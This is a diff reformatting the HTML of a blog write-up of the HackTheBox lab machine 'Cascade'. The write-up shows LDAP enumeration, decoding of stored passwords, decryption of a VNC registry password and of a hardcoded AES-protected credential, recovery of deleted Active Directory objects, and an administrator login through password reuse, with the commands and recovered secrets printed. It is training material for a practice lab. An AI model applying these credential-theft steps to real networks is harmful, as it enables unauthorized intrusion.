@@ -1,169 +1,123 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Cascade publish on Mars 28 2020 by VbScrub. This box is rated as medium box. It implies some LDAP search, some SMB shares, a VNC registry, some reverse engineering and the AD Recycle Bin." />
-<meta name="keywords" content="security, boot2root, HTB, Windows, LDAP, VNC, AD Recycle bin">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Cascade"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Cascade publish on Mars 28 2020 by VbScrub. This box is rated as medium box. It implies some LDAP search, some SMB shares, a VNC registry, some reverse engineering and the AD Recycle Bin."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2020/07/htb-cascade.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2020-07-26 09:30:00+02:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="Windows"/>
-  <meta property="article:tag" content="LDAP"/>
-  <meta property="article:tag" content="VNC"/>
-  <meta property="article:tag" content="AD Recycle bin"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Cascade</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Cascade publish on Mars 28 2020 by VbScrub. This box is rated as medium box. It implies some LDAP search, some SMB shares, a VNC registry, some reverse engineering and the AD Recycle Bin." name="description"/>
+<meta content="security, boot2root, HTB, Windows, LDAP, VNC, AD Recycle bin" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Cascade" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Cascade publish on Mars 28 2020 by VbScrub. This box is rated as medium box. It implies some LDAP search, some SMB shares, a VNC registry, some reverse engineering and the AD Recycle Bin." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2020/07/htb-cascade.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-07-26 09:30:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="Windows" property="article:tag"/>
+<meta content="LDAP" property="article:tag"/>
+<meta content="VNC" property="article:tag"/>
+<meta content="AD Recycle bin" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Cascade</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-cascade">HTB: Cascade</h1>
-    <p>
+<header>
+<h1 id="htb-cascade">HTB: Cascade</h1>
+<p>
       Posted on 26 Jul 2020 in <a href="../../category/security.html">security</a>
 
-        &#8226; 7 min read
+        • 7 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2020.07/cascade_card.png" alt="Cascade Card" width="262"></p>
+</header>
+<div>
+<p><img alt="Cascade Card" class="align-left" src="/media/2020.07/cascade_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/235">Cascade</a> publish on
 Mars 28 2020 by
 <a href="https://www.hackthebox.com/home/users/profile/158833">VbScrub</a>.
 This box is rated as medium box. It implies some LDAP search, some SMB shares,
 a VNC registry, some reverse engineering and the AD Recycle Bin.</p>
-
-
 <h1>Recon</h1>
 <h2>nmap</h2>
 <p>Let us start as always by a <code>nmap</code> scan. The box is quit busy so first of all we
@@ -193,7 +147,6 @@ Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Apr 10 05:57:39 2020 -- 1 IP address (1 host up) scanned in 185.33 seconds
 </code></pre></div>
-
 <p>As always with Windows box there is a lot of open ports and services.
 We try to enumerate a few of them and run
 <a href="https://github.com/portcullislabs/enum4linux">enum4linux</a>.</p>
@@ -201,7 +154,7 @@ We try to enumerate a few of them and run
 <p>The interesting service is the LDAP. When enumerating and reading the result we
 discover that the <code>r.thompson</code> account as a filed <code>cascadeLegacyPwd</code> containing
 some base64 data.</p>
-<div class="highlight"><pre><span></span><code>kali@kali:~$ ldapsearch -h 10.10.10.182 -p 389 -x -b &quot;dc=cascade,dc=local&quot;
+<div class="highlight"><pre><span></span><code>kali@kali:~$ ldapsearch -h 10.10.10.182 -p 389 -x -b "dc=cascade,dc=local"
 &lt;SNIP&gt;
 # Ryan Thompson, Users, UK, cascade.local
 dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
@@ -247,17 +200,15 @@ lastLogonTimestamp: 132294360317419816
 msDS-SupportedEncryptionTypes: 0
 cascadeLegacyPwd: clk0bjVldmE=
 </code></pre></div>
-
 <p>We decode it and found the password <code>rY4n5eva</code> for the <code>r.thompson</code> account.</p>
-<div class="highlight"><pre><span></span><code>kali@kali:~$  echo -ne &#39;clk0bjVldmE=&#39; | base64 -d
+<div class="highlight"><pre><span></span><code>kali@kali:~$  echo -ne 'clk0bjVldmE=' | base64 -d
 rY4n5eva
 </code></pre></div>
-
 <h2>SMB share</h2>
 <p>Using this account we can enumerate the available SMB shares.</p>
-<div class="highlight"><pre><span></span><code>kali@kali:~$  smbclient -L \\\\10.10.10.182 -U &#39;r.thompson&#39;
+<div class="highlight"><pre><span></span><code>kali@kali:~$  smbclient -L \\\\10.10.10.182 -U 'r.thompson'
 Unable to initialize messaging context
-Enter WORKGROUP\r.thompson&#39;s password:
+Enter WORKGROUP\r.thompson's password:
 
         Sharename       Type      Comment
         ---------       ----      -------
@@ -271,7 +222,6 @@ Enter WORKGROUP\r.thompson&#39;s password:
         SYSVOL          Disk      Logon server share
 SMB1 disabled -- no workgroup available
 </code></pre></div>
-
 <p>We mount the <code>Data</code> share using our account and list its content, the file <code>VNC
 Install.reg</code> inside <code>s.smith</code> folder seems interesting.</p>
 <div class="highlight"><pre><span></span><code>kali@kali:~$  sudo mount //10.10.10.182/Data /mnt/ -o username=r.thompson
@@ -297,7 +247,6 @@ tree /mnt/
 
 13 directories, 4 files
 </code></pre></div>
-
 <p>This <code>VNC Install.reg</code> file inside <code>s.smith</code> folder is the Windows Registry of a VNC installation. The
 <code>Password</code> entry is really interesting.</p>
 <div class="highlight"><pre><span></span><code>kali@kali:~$ cat /mnt/IT/Temp/s.smith/VNC\ Install.reg
@@ -306,61 +255,59 @@ tree /mnt/
 [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
 
 [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
-&quot;ExtraPorts&quot;=&quot;&quot;
-&quot;QueryTimeout&quot;=dword:0000001e
-&quot;QueryAcceptOnTimeout&quot;=dword:00000000
-&quot;LocalInputPriorityTimeout&quot;=dword:00000003
-&quot;LocalInputPriority&quot;=dword:00000000
-&quot;BlockRemoteInput&quot;=dword:00000000
-&quot;BlockLocalInput&quot;=dword:00000000
-&quot;IpAccessControl&quot;=&quot;&quot;
-&quot;RfbPort&quot;=dword:0000170c
-&quot;HttpPort&quot;=dword:000016a8
-&quot;DisconnectAction&quot;=dword:00000000
-&quot;AcceptRfbConnections&quot;=dword:00000001
-&quot;UseVncAuthentication&quot;=dword:00000001
-&quot;UseControlAuthentication&quot;=dword:00000000
-&quot;RepeatControlAuthentication&quot;=dword:00000000
-&quot;LoopbackOnly&quot;=dword:00000000
-&quot;AcceptHttpConnections&quot;=dword:00000001
-&quot;LogLevel&quot;=dword:00000000
-&quot;EnableFileTransfers&quot;=dword:00000001
-&quot;RemoveWallpaper&quot;=dword:00000001
-&quot;UseD3D&quot;=dword:00000001
-&quot;UseMirrorDriver&quot;=dword:00000001
-&quot;EnableUrlParams&quot;=dword:00000001
-&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f
-&quot;AlwaysShared&quot;=dword:00000000
-&quot;NeverShared&quot;=dword:00000000
-&quot;DisconnectClients&quot;=dword:00000001
-&quot;PollingInterval&quot;=dword:000003e8
-&quot;AllowLoopback&quot;=dword:00000000
-&quot;VideoRecognitionInterval&quot;=dword:00000bb8
-&quot;GrabTransparentWindows&quot;=dword:00000001
-&quot;SaveLogToAllUsersPath&quot;=dword:00000000
-&quot;RunControlInterface&quot;=dword:00000001
-&quot;IdleTimeout&quot;=dword:00000000
-&quot;VideoClasses&quot;=&quot;&quot;
-&quot;VideoRects&quot;=&quot;&quot;
+"ExtraPorts"=""
+"QueryTimeout"=dword:0000001e
+"QueryAcceptOnTimeout"=dword:00000000
+"LocalInputPriorityTimeout"=dword:00000003
+"LocalInputPriority"=dword:00000000
+"BlockRemoteInput"=dword:00000000
+"BlockLocalInput"=dword:00000000
+"IpAccessControl"=""
+"RfbPort"=dword:0000170c
+"HttpPort"=dword:000016a8
+"DisconnectAction"=dword:00000000
+"AcceptRfbConnections"=dword:00000001
+"UseVncAuthentication"=dword:00000001
+"UseControlAuthentication"=dword:00000000
+"RepeatControlAuthentication"=dword:00000000
+"LoopbackOnly"=dword:00000000
+"AcceptHttpConnections"=dword:00000001
+"LogLevel"=dword:00000000
+"EnableFileTransfers"=dword:00000001
+"RemoveWallpaper"=dword:00000001
+"UseD3D"=dword:00000001
+"UseMirrorDriver"=dword:00000001
+"EnableUrlParams"=dword:00000001
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+"AlwaysShared"=dword:00000000
+"NeverShared"=dword:00000000
+"DisconnectClients"=dword:00000001
+"PollingInterval"=dword:000003e8
+"AllowLoopback"=dword:00000000
+"VideoRecognitionInterval"=dword:00000bb8
+"GrabTransparentWindows"=dword:00000001
+"SaveLogToAllUsersPath"=dword:00000000
+"RunControlInterface"=dword:00000001
+"IdleTimeout"=dword:00000000
+"VideoClasses"=""
+"VideoRects"=""
 </code></pre></div>
-
 <p>A few Google search lead us to <a href="https://github.com/frizb/PasswordDecrypts">github repository explaining how to decrypt the
 password</a> using the Interactive Ruby
 Shell from metasploit.</p>
 <div class="highlight"><pre><span></span><code>$ msfconsole
 msf5 &gt; irb
 [*] Starting IRB shell...
-[*] You are in the &quot;framework&quot; object
+[*] You are in the "framework" object
 
-irb: warn: can&#39;t alias jobs from irb_jobs.
-&gt;&gt; fixedkey = &quot;\x17\x52\x6b\x06\x23\x4e\x58\x07&quot;
-=&gt; &quot;\u0017Rk\u0006#NX\a&quot;
-&gt;&gt; require &#39;rex/proto/rfb&#39;
+irb: warn: can't alias jobs from irb_jobs.
+&gt;&gt; fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+=&gt; "\u0017Rk\u0006#NX\a"
+&gt;&gt; require 'rex/proto/rfb'
 =&gt; true
-&gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&quot;6BCF2A4B6E5ACA0F&quot;].pack(&#39;H*&#39;), fixedkey
-=&gt; &quot;sT333ve2&quot;
+&gt;&gt; Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), fixedkey
+=&gt; "sT333ve2"
 </code></pre></div>
-
 <p>With this account we can connect to the box using
 <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>. We quickly found the
 user flag inside on our user Desktop.</p>
@@ -370,10 +317,9 @@ Evil-WinRM shell v1.8
 
 Info: Establishing connection to remote endpoint
 
-*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; type &quot;C:\Users\s.smith\Desktop\user.txt&quot;
+*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; type "C:\Users\s.smith\Desktop\user.txt"
 6c624e1637cf604fec1cda8de1ad0779
 </code></pre></div>
-
 <h1>Getting root</h1>
 <p>We try to mount some other share with our <code>s.smith</code> account. <code>Audit</code> is interesting as
 there is a executable binary <code>CascAudit.exe</code>, a DLL <code>CascCrypto.dll</code>, and a
@@ -396,11 +342,10 @@ kali@kali:~$ tree /mnt/
 
 3 directories, 8 files
 </code></pre></div>
-
 <p>We load the executable in <a href="https://github.com/0xd4d/dnSpy">DNSpy</a> and look at
 the code. We saw a function that use the Crypto DLL to decrypt a text providing
 from the database using the key <code>c4scadek3y654321</code>.</p>
-<div class="highlight"><pre><span></span><code>using (SQLiteConnection sqliteConnection = new SQLiteConnection(&quot;Data Source=&quot; + MyProject.Application.CommandLineArgs[0] + &quot;;Version=3;&quot;))
+<div class="highlight"><pre><span></span><code>using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
 {
   string str = string.Empty;
   string password = string.Empty;
@@ -408,21 +353,21 @@ from the database using the key <code>c4scadek3y654321</code>.</p>
   try
   {
     sqliteConnection.Open();
-    using (SQLiteCommand sqliteCommand = new SQLiteCommand(&quot;SELECT * FROM LDAP&quot;, sqliteConnection))
+    using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
     {
       using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
       {
         sqliteDataReader.Read();
-        str = Conversions.ToString(sqliteDataReader[&quot;Uname&quot;]);
-        str2 = Conversions.ToString(sqliteDataReader[&quot;Domain&quot;]);
-        string text = Conversions.ToString(sqliteDataReader[&quot;Pwd&quot;]);
+        str = Conversions.ToString(sqliteDataReader["Uname"]);
+        str2 = Conversions.ToString(sqliteDataReader["Domain"]);
+        string text = Conversions.ToString(sqliteDataReader["Pwd"]);
         try
         {
-          password = Crypto.DecryptString(text, &quot;c4scadek3y654321&quot;);
+          password = Crypto.DecryptString(text, "c4scadek3y654321");
         }
         catch (Exception ex)
         {
-          Console.WriteLine(&quot;Error decrypting password: &quot; + ex.Message);
+          Console.WriteLine("Error decrypting password: " + ex.Message);
           return;
         }
       }
@@ -430,16 +375,14 @@ from the database using the key <code>c4scadek3y654321</code>.</p>
     sqliteConnection.Close();
   }
 </code></pre></div>
-
 <p>We repeat the SQL request using <code>sqlite3</code> and got some base64 data for the
 user <code>ArkSvc</code>.</p>
 <div class="highlight"><pre><span></span><code>kali@kali:~/pown/htb_cascade$ sqlite3 Audit.db
 SQLite version 3.31.0 2019-12-29 00:52:41
-Enter &quot;.help&quot; for usage hints.
+Enter ".help" for usage hints.
 sqlite&gt; SELECT * FROM LDAP;
 1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
 </code></pre></div>
-
 <p>We look at the crypto code in the DLL (still using <a href="https://github.com/0xd4d/dnSpy">DNSpy</a>).
 This is a simple AES using a fix IV and the key passed in parameter by the
 executable binary.</p>
@@ -450,7 +393,7 @@ public static string DecryptString(string EncryptedString, string Key)
   Aes aes = Aes.Create();
   aes.KeySize = 128;
   aes.BlockSize = 128;
-  aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;);
+  aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
   aes.Mode = CipherMode.CBC;
   aes.Key = Encoding.UTF8.GetBytes(Key);
   string @string;
@@ -466,8 +409,7 @@ public static string DecryptString(string EncryptedString, string Key)
   return @string;
 }
 </code></pre></div>
-
-<p>Here is the <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)&input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09">CyberChef recipe</a> to decode the password: <code>w3lc0meFr31nd</code>.</p>
+<p>Here is the <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)&amp;input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09">CyberChef recipe</a> to decode the password: <code>w3lc0meFr31nd</code>.</p>
 <p>From there we can can connect with the <code>ArkSvc</code> account using
 <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> and enumerate our
 permissions.</p>
@@ -515,12 +457,11 @@ SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 </code></pre></div>
-
 <p>We are in the group <code>AD Recycle Bin</code>. A few Google research lead us to
 <a href="https://docs.microsoft.com/en-us/archive/blogs/askds/the-ad-recycle-bin-understanding-implementing-best-practices-and-troubleshooting">a Microsoft article about AD recycle bin</a>.</p>
 <p>We execute the Powershell command to list the deleted objects and see some
 <code>cascadeLegacyPwd</code> filed for the user <code>TempAdmin</code>.</p>
-<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\arksvc\Desktop&gt;  Get-ADObject -filter &#39;isdeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#39; -includeDeletedObjects -property *
+<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\arksvc\Desktop&gt;  Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
 
 &lt;SNIP&gt;
 
@@ -601,22 +542,19 @@ uSNCreated                      : 237695
 whenChanged                     : 1/27/2020 3:24:34 AM
 whenCreated                     : 1/27/2020 3:23:08 AM
 </code></pre></div>
-
 <p>We decode the base64 filed and found some password.</p>
-<div class="highlight"><pre><span></span><code>kali@kali:~$ echo -ne &#39;YmFDVDNyMWFOMDBkbGVz&#39; | base64 -d
+<div class="highlight"><pre><span></span><code>kali@kali:~$ echo -ne 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
 baCT3r1aN00dles
 </code></pre></div>
-
 <p>My first idea was to restore the object but it seems that this is not possible.</p>
-<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\arksvc\Documents&gt;  Get-ADObject -Filter &#39;samaccountname -eq &quot;TempAdmin&quot;&#39; -IncludeDeletedObjects | Restore-ADObject
+<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\arksvc\Documents&gt;  Get-ADObject -Filter 'samaccountname -eq "TempAdmin"' -IncludeDeletedObjects | Restore-ADObject
 Insufficient access rights to perform the operation
 At line:1 char:81
-+ ... ccountname -eq &quot;TempAdmin&quot;&#39; -IncludeDeletedObjects | Restore-ADObject
++ ... ccountname -eq "TempAdmin"' -IncludeDeletedObjects | Restore-ADObject
 +                                                          ~~~~~~~~~~~~~~~~
     + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException
     + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject
 </code></pre></div>
-
 <p>Therefore I just tried to connect as <code>administrator</code> hoping for password reuse,
 it worked and I was able to get the root flag..</p>
 <div class="highlight"><pre><span></span><code>kali@kali:~/tools/github/evil-winrm$ ruby ./evil-winrm.rb -i 10.10.10.182 -u administrator -pbaCT3r1aN00dles
@@ -628,69 +566,47 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/root.txt
 86e93219a4f189663d558122a087a4c3
 </code></pre></div>
-
 <h2>Wrapping up</h2>
 <p>This box was fun as there was a lot of different stuff and everything went
 smoothly. The only painful part is the dig into the <code>ldapsearch</code> results as the
 file is quit long (6 363 lines).</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/windows.html">Windows</a>
-      <a href="../../tag/ldap.html">LDAP</a>
-      <a href="../../tag/vnc.html">VNC</a>
-      <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2020/07/htb-sauna.html" title="HTB: Sauna">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2020/08/vulnhub-infosec-prep-oscp.html" title="Vulnhub: InfoSec Prep: OSCP">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/windows.html">Windows</a>
+<a href="../../tag/ldap.html">LDAP</a>
+<a href="../../tag/vnc.html">VNC</a>
+<a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2020/07/htb-sauna.html" title="HTB: Sauna">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2020/08/vulnhub-infosec-prep-oscp.html" title="Vulnhub: InfoSec Prep: OSCP">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -701,6 +617,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
